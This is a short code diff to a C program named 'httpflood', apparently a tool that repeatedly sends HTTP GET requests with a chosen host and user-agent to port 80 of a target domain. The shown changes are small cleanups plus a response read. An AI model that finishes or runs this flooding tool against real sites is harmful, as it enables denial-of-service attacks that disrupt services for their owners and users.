@@ -12,12 +12,12 @@ int main(int argc,char *argv[])
 {
     /* first what are we going to send and where are we going to send it? */
     int portno = 80;
-    char *host = argv[1];
-    char *message_fmt = "GET / HTTP/1.1\nHost:%s\nUser-agent:%s\r\n\r\n";
+    const char *host = argv[1];
+    const char *message_fmt = "GET / HTTP/1.1\nHost:%s\nUser-agent:%s\r\n\r\n";
 
     struct hostent *server;
     struct sockaddr_in serv_addr;
-    int sockfd, bytes, sent, received, total;
+    int sockfd, bytes, sent, total;
     char message[1024],response[4096];
 
     if (argc < 3) { puts("Usage: ./httpflood <domain> <useragent>"); exit(0); }
@@ -57,6 +57,7 @@ while (1) {
         if (bytes == 0)
             break;
         sent+=bytes;
+        read(sockfd, response, sizeof(response));
     } while (sent < total);
 
     /* close the socket */
